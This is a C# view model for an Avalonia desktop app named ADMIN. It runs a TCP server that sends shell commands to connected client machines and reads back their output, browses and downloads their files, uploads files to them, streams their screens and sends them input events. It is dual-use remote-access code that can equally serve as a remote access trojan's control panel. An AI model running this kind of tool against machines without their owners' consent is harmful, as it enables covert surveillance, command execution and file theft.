using System;
using System.Collections.Concurrent;
using System.Collections.ObjectModel;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using ADMIN.ViewModels;
using Avalonia.Threading;
using CommunityToolkit.Mvvm.ComponentModel;
using Tmds.DBus.Protocol;
using DotNetEnv;
using System.Linq;
using SkiaSharp;
using ADMIN.Models;

namespace ADMIN.ViewModels
{
    public partial class MainWindowViewModel : ViewModelBase
    {
        public ObservableCollection<string> ConnectedClients { get; set; } = new ObservableCollection<string>();
        public ObservableCollection<string> FilteredClients { get; set; } = new ObservableCollection<string>();
        public ObservableCollection<string> ServerLogs { get; set; } = new ObservableCollection<string>();

        /// <summary>Live list of connected client IPs shown in the sidebar.</summary>
        public ObservableCollection<string> ConnectedIPs { get; set; } = new ObservableCollection<string>();

        private string _activityFilterIp = string.Empty;
        public string ActivityFilterIp
        {
            get => _activityFilterIp;
            set
            {
                _activityFilterIp = value;
                OnPropertyChanged(nameof(ActivityFilterIp));
            }
        }

        private bool _isFiltered = false;
        public bool IsFiltered
        {
            get => _isFiltered;
            set
            {
                _isFiltered = value;
                OnPropertyChanged(nameof(IsFiltered));
                OnPropertyChanged(nameof(FilterButtonLabel));
            }
        }

        public string FilterButtonLabel => _isFiltered ? "🔍 Clear Filter" : "🔍 Filter by IP";

        public void ApplyOrClearFilter(string ip)
        {
            if (_isFiltered)
            {
                // Clear filter
                IsFiltered = false;
                ActivityFilterIp = string.Empty;
                FilteredClients.Clear();
                foreach (var item in ConnectedClients)
                    FilteredClients.Add(item);
            }
            else if (!string.IsNullOrWhiteSpace(ip))
            {
                ForceApplyFilter(ip);
            }
        }

        /// <summary>Always applies the filter to the given IP, regardless of current state.</summary>
        public void ForceApplyFilter(string ip)
        {
            if (string.IsNullOrWhiteSpace(ip)) return;
            IsFiltered = true;
            ActivityFilterIp = ip;
            FilteredClients.Clear();
            foreach (var item in ConnectedClients.Where(c => c.Contains(ip)))
                FilteredClients.Add(item);
        }

        /// <summary>Called after ConnectedClients changes to keep FilteredClients in sync.</summary>
        public void SyncFilteredClients()
        {
            FilteredClients.Clear();
            var source = _isFiltered
                ? ConnectedClients.Where(c => c.Contains(_activityFilterIp))
                : ConnectedClients;
            foreach (var item in source)
                FilteredClients.Add(item);
        }

        private ConcurrentDictionary<string, TcpClient> _clientConnections = new();
        private NetworkStream _stream;

        // ── Screen streaming ─────────────────────────────────────────────────
        // ip → (remoteWidth, remoteHeight) reported in frame header
        private ConcurrentDictionary<string, (int w, int h)> _screenDimensions = new();

        /// <summary>Raised when a complete JPEG frame arrives from a client.</summary>
        public event Action<string, byte[], int, int>? FrameReceived;

        // ── File manager VMs (one per open File Manager window) ──────────────
        private ConcurrentDictionary<string, FileManagerViewModel> _fileManagers = new();
        public MainWindowViewModel()
        {
            DotNetEnv.Env.Load();
            _ = StartServer();
        }

        // Function to start the server and accept incoming clients
        private async Task StartServer()
        {
            try
            {
                string serverPortStr = Environment.GetEnvironmentVariable("SERVER_PORT") ?? "2025";
                int port = int.TryParse(serverPortStr, out int p) ? p : 2025;
                TcpListener listener = new TcpListener(IPAddress.Any, port);
                listener.Server.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                listener.Start();

                while (true)
                {
                    TcpClient client = await listener.AcceptTcpClientAsync();
                    _stream = client.GetStream();
                    _ = HandleClientAsync(client); // fire-and-forget
                }
            }
            catch (Exception ex)
            {
                ServerLogs.Insert(0,$"Error: {ex.Message}");
            }
        }

        private async Task HandleClientAsync(TcpClient client)
        {
            string clientIp = ((IPEndPoint)client.Client.RemoteEndPoint)?.Address.ToString();
            NetworkStream stream = client.GetStream();

            // Use a larger buffer and a StringBuilder to accumulate header lines
            byte[] buffer = new byte[65536];
            var headerAccum = new System.Text.StringBuilder();

            try
            {
                _clientConnections[clientIp] = client;

                // Add to live IP list on the UI thread
                await Dispatcher.UIThread.InvokeAsync(() =>
                {
                    if (!ConnectedIPs.Contains(clientIp))
                        ConnectedIPs.Add(clientIp);
                });

                while (true)
                {
                    int length = await stream.ReadAsync(buffer, 0, buffer.Length);
                    if (length <= 0) break;

                    string chunk = Encoding.UTF8.GetString(buffer, 0, length);

                    // ── Binary frame path ────────────────────────────────────
                    // If the chunk starts with "frame:" we read the size then
                    // pull exactly that many bytes from the stream.
                    if (chunk.StartsWith("frame:"))
                    {
                        try
                        {
                            // Header format: "frame:<w>x<h>:<size>\n"  or "frame:<size>\n"
                            int newline = chunk.IndexOf('\n');
                            if (newline < 0) continue; // malformed, skip

                            string header = chunk.Substring(0, newline);
                            // header examples:
                            //   "frame:1920x1080:48200"
                            //   "frame:48200"
                            string[] headerParts = header.Substring("frame:".Length).Split(':');
                            int frameSize;
                            int remoteW = 0, remoteH = 0;

                            if (headerParts.Length == 2)
                            {
                                // "WxH:size"
                                var dims = headerParts[0].Split('x');
                                int.TryParse(dims.ElementAtOrDefault(0), out remoteW);
                                int.TryParse(dims.ElementAtOrDefault(1), out remoteH);
                                int.TryParse(headerParts[1], out frameSize);
                            }
                            else
                            {
                                int.TryParse(headerParts[0], out frameSize);
                            }

                            if (frameSize <= 0 || frameSize > 10_000_000) continue;

                            // Any bytes after the \n in this chunk are the start of the frame
                            int headerLen = Encoding.UTF8.GetByteCount(chunk.Substring(0, newline + 1));
                            byte[] frameBuffer = new byte[frameSize];
                            int bytesAlreadyRead = Math.Min(length - headerLen, frameSize);
                            if (bytesAlreadyRead > 0)
                                Array.Copy(buffer, headerLen, frameBuffer, 0, bytesAlreadyRead);

                            int totalRead = bytesAlreadyRead;
                            while (totalRead < frameSize)
                            {
                                int read = await stream.ReadAsync(frameBuffer, totalRead, frameSize - totalRead);
                                if (read == 0) break;
                                totalRead += read;
                            }

                            if (totalRead == frameSize)
                            {
                                _screenDimensions[clientIp] = (remoteW, remoteH);
                                FrameReceived?.Invoke(clientIp, frameBuffer, remoteW, remoteH);
                            }
                        }
                        catch { }
                        continue; // do not fall through to text handling
                    }

                    // ── Text message path (existing logic, unchanged) ─────────
                    string clientMessage = chunk;

                    // Update the UI with the client message
                    await Dispatcher.UIThread.InvokeAsync(() =>
                    {
                        string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                        string entry = $"{clientIp}: {clientMessage}";

                        if (clientMessage.StartsWith("pathlist:"))
                        {
                            string entries = clientMessage.Substring(9).Trim();
                            // Route to FileManagerViewModel if one is open for this client
                            if (_fileManagers.TryGetValue(clientIp, out var fmVm))
                                fmVm.HandlePathList(entries);
                        }
                        else if (clientMessage.StartsWith("fileDownload:"))
                        {
                            try
                            {
                                // Parse the header
                                string[] parts = clientMessage.Substring("fileDownload:".Length).Split(':');
                                if (parts.Length == 2)
                                {
                                    string fileName = parts[0];
                                    if (int.TryParse(parts[1], out int fileSize))
                                    {
                                        // Get the stream from the client connection
                                        NetworkStream clientStream = client.GetStream();

                                        // Create a buffer to read file content
                                        byte[] fileBuffer = new byte[fileSize];
                                        int totalBytesRead = 0;
                                        int bytesRead;

                                        // Read the file content from the client stream
                                        while (totalBytesRead < fileSize &&
                                               (bytesRead = clientStream.Read(fileBuffer, totalBytesRead, fileSize - totalBytesRead)) > 0)
                                        {
                                            totalBytesRead += bytesRead;
                                        }

                                        // Save to the folder selected in the File Manager (LOCAL pane),
                                        // falling back to a "file_downloaded" folder if FM is not open.
                                        string destFolder = "file_downloaded";
                                        if (_fileManagers.TryGetValue(clientIp, out var fmVm2))
                                            destFolder = fmVm2.GetDownloadDestinationFolder();

                                        Directory.CreateDirectory(destFolder);
                                        string savePath = Path.Combine(destFolder, fileName);
                                        File.WriteAllBytes(savePath, fileBuffer);

                                        fmVm2?.HandleDownloadComplete(fileName, savePath);
                                        string dlMsg = $"[{timestamp}] [DOWNLOAD] {clientIp} → '{fileName}' ({totalBytesRead} bytes) saved to {savePath}";
                                        AppendMessageToLogAsync(dlMsg);
                                        ServerLogs.Insert(0, dlMsg);
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                string errMsg = $"[{timestamp}] [DOWNLOAD ERROR] {clientIp}: {ex.Message}";
                                AppendMessageToLogAsync(errMsg);
                                ServerLogs.Insert(0, errMsg);
                            }
                        }
                        else if (clientMessage.StartsWith("cmd_output:"))
                        {
                            string output = clientMessage.Substring("cmd_output:".Length).Trim();
                            ServerLogs.Insert(0, $"[{timestamp}] [{clientIp}] CMD OUTPUT:\n{output}");
                            AppendMessageToLogAsync($"[{timestamp}] [{clientIp}] CMD OUTPUT:\n{output}");
                        }
                        else if (clientMessage.StartsWith("frame:"))
                        {
                            // Frame header arrived in the text buffer — hand off to binary reader
                            // We do NOT process this on the UI thread; break out and handle below
                        }
                        else
                        {
                            // Add the entry to ConnectedClients and log it if not a pathlist message
                            if (!ConnectedClients.Contains(entry))
                            {
                                ConnectedClients.Insert(0, $"[{timestamp}] {entry}");
                                AppendMessageToLogAsync($"[{timestamp}] {entry}");
                            }
                        }

                        ReverseCollection();
                    });
                }
            }
            catch (Exception ex)
            {
                    ServerLogs.Insert(0, $"Client Error: {ex.Message}");
            }
            finally
            {
                // Remove the client from the dictionary upon disconnect
                _clientConnections.TryRemove(clientIp, out _);

                // Remove from live IP list on the UI thread
                await Dispatcher.UIThread.InvokeAsync(() =>
                {
                    ConnectedIPs.Remove(clientIp);
                    ServerLogs.Insert(0, $"Client disconnected: {clientIp}");
                });
            }
        }


        private void ReverseCollection()
        {
            // Reverse the collection and clear and refill the ObservableCollection
            var limitedClients = ConnectedClients.Reverse().Take(100).ToList();

            ConnectedClients.Clear();
            foreach (var client in limitedClients)
            {
                ConnectedClients.Insert(0, client);
            }

            SyncFilteredClients();
        }

        // Send a message to a specific client
        public async Task SendMessageAsync(string ipAddress, string message)
        {
            if (_clientConnections.TryGetValue(ipAddress, out TcpClient client))
            {
                try
                {
                    var stream = client.GetStream();
                    byte[] messageBytes = Encoding.UTF8.GetBytes($"cmd:{message}");
                    await stream.WriteAsync(messageBytes, 0, messageBytes.Length);

                    await Dispatcher.UIThread.InvokeAsync(() =>
                    {
                        ServerLogs.Insert(0,  $"Command Sent to {ipAddress}: {message}");
                    });
                }
                catch (Exception ex)
                {
            
                        ServerLogs.Insert(0, $"Send failed to {ipAddress}: {ex.Message}");
                }
            }
            else
            {
                
                ServerLogs.Insert(0, $"Client {ipAddress} not found.");
            }
        }
        public async Task ViewDirectories(string ipAddress, string path)
        {
            if (_clientConnections.TryGetValue(ipAddress, out TcpClient client))
            {
                try
                {
                    var stream = client.GetStream();
                    byte[] messageBytes = Encoding.UTF8.GetBytes($"__open_file:{path}");
                    await stream.WriteAsync(messageBytes, 0, messageBytes.Length);

                    await Dispatcher.UIThread.InvokeAsync(() =>
                    {
                        ServerLogs.Insert(0, $"Command Sent to {ipAddress}");
                    });
                }
                catch (Exception ex)
                {
                  
                        ServerLogs.Insert(0, $"Send failed to {ipAddress}: {ex.Message}");
                }
            }
            else
            {
                ServerLogs.Insert(0, $"Client {ipAddress} not found.");
            }
        }
        public async Task DownloadFile(string ipAddress, string path)
        {
            if (_clientConnections.TryGetValue(ipAddress, out TcpClient client))
            {
                try
                {
                    var stream = client.GetStream();
                    byte[] messageBytes = Encoding.UTF8.GetBytes($"__download_file:{path}");
                    await stream.WriteAsync(messageBytes, 0, messageBytes.Length);

                    await Dispatcher.UIThread.InvokeAsync(() =>
                    {
                        ServerLogs.Insert(0, $"Command Sent to {ipAddress}: {path}");
                    });
                }
                catch (Exception ex)
                {
                    ServerLogs.Insert(0, $"Send failed to {ipAddress}: {ex.Message}");
                }
            }
            else
            {
                ServerLogs.Insert(0, $"Client {ipAddress} not found.");
            }
        }
        public async Task UploadFile(string ipAddress, string attachment)
        {
            if (_clientConnections.TryGetValue(ipAddress, out TcpClient client))
            {
                try
                {
                    // Read file content
                    byte[] fileBytes = await File.ReadAllBytesAsync(attachment);

                    // Use the specific client's stream, not the shared _stream field
                    var clientStream = client.GetStream();

                    // Send file metadata (header) — protocol: __upload_file:<destFolder>:<name>:<size>\n
                    string dest = @"C:\Users\Public";
                    string header = $"__upload_file:{dest}:{Path.GetFileName(attachment)}:{fileBytes.Length}\n";
                    byte[] headerBytes = Encoding.UTF8.GetBytes(header);
                    await clientStream.WriteAsync(headerBytes, 0, headerBytes.Length);

                    // Send file content
                    await clientStream.WriteAsync(fileBytes, 0, fileBytes.Length);

                    // Flush the stream
                    await clientStream.FlushAsync();
                    string uploadTimestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                    string upMsg = $"[{uploadTimestamp}] [UPLOAD] '{Path.GetFileName(attachment)}' ({fileBytes.Length} bytes) → {ipAddress}:{dest}";
                    AppendMessageToLogAsync(upMsg);
                    await Dispatcher.UIThread.InvokeAsync(() => ServerLogs.Insert(0, upMsg));
                }
                catch (Exception ex)
                {
                        ServerLogs.Insert(0, $"Send failed to {ipAddress}: {ex.Message}");
                }
            }
            else
            {
                ServerLogs.Insert(0, $"Client {ipAddress} not found.");
            }
        }

        public async Task ExportTxt()
        {
            try
            {
                // Define the folder path and file name with a timestamp
                string folderPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Logs");
                string timestamp = DateTime.Now.ToString("yyyyMMddHHmmss");
                string filePath = Path.Combine(folderPath, $"Log-{timestamp}.txt");

                // Create the folder if it doesn't exist
                if (!Directory.Exists(folderPath))
                {
                    Directory.CreateDirectory(folderPath);
                }

                // Create a StreamWriter to write to the file
                using (StreamWriter writer = new StreamWriter(filePath))
                {
                    // Iterate through the ObservableCollection and write each item to the file
                    foreach (var client in ConnectedClients)
                    {
                        writer.WriteLine(client);
                    }
                }

                // Optionally notify that the export was successful
                Console.WriteLine("Log exported successfully!");
                ServerLogs.Insert(0, $"[SUCCESS] Log file path: {filePath}");

            }
            catch (IOException ex)
            {
                // Handle any exceptions (e.g., file write errors)
                Console.WriteLine($"Error exporting log: {ex.Message}");
                ServerLogs.Insert(0, $"[FAILED] Export Failed: {ex.Message}");
            }

        }
        public void AppendMessageToLogAsync(string message)
        {
            try
            {
                string dateStr = DateTime.Now.ToString("yyyyMMdd");
                string logFileName = $"log-{dateStr}.txt";
                string logFolder = "logs";
                Directory.CreateDirectory(logFolder);
                string logFilePath = Path.Combine(logFolder, logFileName);
                string line = $"{message}{Environment.NewLine}";
                File.AppendAllText(logFilePath, line);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to write log: {ex.Message}");
            }
        }

        // ── Screen streaming ─────────────────────────────────────────────────

        public async Task StartScreenStreamAsync(string ipAddress)
        {
            if (_clientConnections.TryGetValue(ipAddress, out TcpClient client))
            {
                try
                {
                    var stream = client.GetStream();
                    byte[] msg = Encoding.UTF8.GetBytes("__screen_start");
                    await stream.WriteAsync(msg, 0, msg.Length);
                    ServerLogs.Insert(0, $"Screen stream started for {ipAddress}");
                }
                catch (Exception ex)
                {
                    ServerLogs.Insert(0, $"Screen start failed for {ipAddress}: {ex.Message}");
                }
            }
            else
            {
                ServerLogs.Insert(0, $"Client {ipAddress} not found.");
            }
        }

        public async Task StopScreenStreamAsync(string ipAddress)
        {
            if (_clientConnections.TryGetValue(ipAddress, out TcpClient client))
            {
                try
                {
                    var stream = client.GetStream();
                    byte[] msg = Encoding.UTF8.GetBytes("__screen_stop");
                    await stream.WriteAsync(msg, 0, msg.Length);
                    ServerLogs.Insert(0, $"Screen stream stopped for {ipAddress}");
                }
                catch (Exception ex)
                {
                    ServerLogs.Insert(0, $"Screen stop failed for {ipAddress}: {ex.Message}");
                }
            }
        }

        public async Task SendInputEventAsync(string ipAddress, string payload)
        {
            if (_clientConnections.TryGetValue(ipAddress, out TcpClient client))
            {
                try
                {
                    var stream = client.GetStream();
                    byte[] msg = Encoding.UTF8.GetBytes(payload);
                    await stream.WriteAsync(msg, 0, msg.Length);
                }
                catch { }
            }
        }

        // ── File Manager ─────────────────────────────────────────────────────

        public FileManagerViewModel GetOrCreateFileManager(string ipAddress)
        {
            return _fileManagers.GetOrAdd(ipAddress, ip =>
            {
                var vm = new FileManagerViewModel(ip);
                vm.SendCommand = async (targetIp, command) =>
                {
                    if (command.StartsWith("__upload_file_raw:"))
                    {
                        // Format: "__upload_file_raw:<destFolder>:<name>:<size>"
                        // Extract the local file path from the FM's selected local node
                        string rest = command.Substring("__upload_file_raw:".Length);
                        // rest = "<destFolder>:<name>:<size>"
                        // destFolder may contain colons (e.g. C:\...) so split from the right
                        int lastColon  = rest.LastIndexOf(':');
                        int secondLast = rest.LastIndexOf(':', lastColon - 1);
                        if (lastColon > 0 && secondLast > 0)
                        {
                            string destFolder = rest.Substring(0, secondLast);
                            // string fileName = rest.Substring(secondLast + 1, lastColon - secondLast - 1);
                            // Actual bytes come from the local node selected in the FM
                            if (vm.SelectedLocalNode != null && !vm.SelectedLocalNode.IsDirectory)
                                await UploadFileToClientAsync(targetIp, vm.SelectedLocalNode.FullPath, destFolder);
                        }
                        return;
                    }
                    if (_clientConnections.TryGetValue(targetIp, out TcpClient c))
                    {
                        byte[] bytes = Encoding.UTF8.GetBytes(command);
                        await c.GetStream().WriteAsync(bytes, 0, bytes.Length);
                    }
                };
                return vm;
            });
        }

        /// <summary>
        /// Upload a local file to the client, saving it into <paramref name="remoteDestFolder"/>.
        /// If remoteDestFolder is null/empty the CLIENT will use its default location.
        /// </summary>
        public async Task UploadFileToClientAsync(string ipAddress, string localFilePath, string? remoteDestFolder = null)
        {
            if (!File.Exists(localFilePath)) return;
            if (!_clientConnections.TryGetValue(ipAddress, out TcpClient client)) return;

            try
            {
                byte[] fileBytes = await File.ReadAllBytesAsync(localFilePath);
                string fileName = Path.GetFileName(localFilePath) ?? localFilePath;
                var stream = client.GetStream();

                // Protocol: __upload_file:<destFolder>:<name>:<size>\n<bytes>
                // CLIENT will save to destFolder\name.
                string dest = string.IsNullOrWhiteSpace(remoteDestFolder) ? @"C:\Users\Public" : remoteDestFolder;
                string header = $"__upload_file:{dest}:{fileName}:{fileBytes.Length}\n";
                byte[] headerBytes = Encoding.UTF8.GetBytes(header);
                await stream.WriteAsync(headerBytes, 0, headerBytes.Length);
                await stream.WriteAsync(fileBytes, 0, fileBytes.Length);
                await stream.FlushAsync();

                string uploadTimestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string upMsg = $"[{uploadTimestamp}] [UPLOAD] '{fileName}' ({fileBytes.Length} bytes) → {ipAddress}:{dest}";
                AppendMessageToLogAsync(upMsg);
                await Dispatcher.UIThread.InvokeAsync(() => ServerLogs.Insert(0, upMsg));
                if (_fileManagers.TryGetValue(ipAddress, out var fmVm))
                    fmVm.Status = $"Uploaded '{fileName}' → {dest}";
            }
            catch (Exception ex)
            {
                ServerLogs.Insert(0, $"Upload failed to {ipAddress}: {ex.Message}");
            }
        }

    }
}
